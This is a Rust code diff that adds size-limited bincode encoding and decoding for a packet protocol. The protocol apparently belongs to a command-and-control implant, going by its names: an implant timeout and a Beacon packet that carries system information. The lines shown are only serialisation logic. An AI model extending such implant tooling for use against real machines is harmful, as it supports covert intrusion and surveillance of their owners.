@@ -1,11 +1,51 @@
-use bincode::{Decode, Encode};
+use bincode::{Decode, Encode, config};
 use sysinfo::System;
 
 pub const IMPLANT_TIMEOUT_SECONDS: u64 = 60 * 60;
+pub const MAX_PACKET_SIZE_BYTES: usize = 1024;
 
 #[derive(Debug, Encode, Decode)]
 pub enum Packet {
     Beacon { system_info: SystemInfo },
+}
+
+#[derive(Debug)]
+pub enum PacketSerializationError {
+    PacketTooLong,
+    EncodingError(bincode::error::EncodeError),
+}
+
+pub fn encode(packet: &Packet) -> Result<Vec<u8>, PacketSerializationError> {
+    let bytes = bincode::encode_to_vec(packet, config::standard());
+    match bytes {
+        Ok(bytes) => {
+            if bytes.len() > MAX_PACKET_SIZE_BYTES {
+                return Err(PacketSerializationError::PacketTooLong);
+            }
+
+            return Ok(bytes);
+        }
+        Err(e) => return Err(PacketSerializationError::EncodingError(e)),
+    }
+}
+
+#[derive(Debug)]
+pub enum PacketDeserializationError {
+    PacketTooLong,
+    DecodingError(bincode::error::DecodeError),
+}
+
+pub fn decode(bytes: &Vec<u8>) -> Result<Packet, PacketDeserializationError> {
+    if bytes.len() > MAX_PACKET_SIZE_BYTES {
+        return Err(PacketDeserializationError::PacketTooLong);
+    }
+
+    let packet = bincode::decode_from_slice(bytes.as_slice(), config::standard());
+
+    match packet {
+        Ok(packet) => Ok(packet.0),
+        Err(e) => Err(PacketDeserializationError::DecodingError(e)),
+    }
 }
 
 #[derive(Debug, Clone, Encode, Decode)]
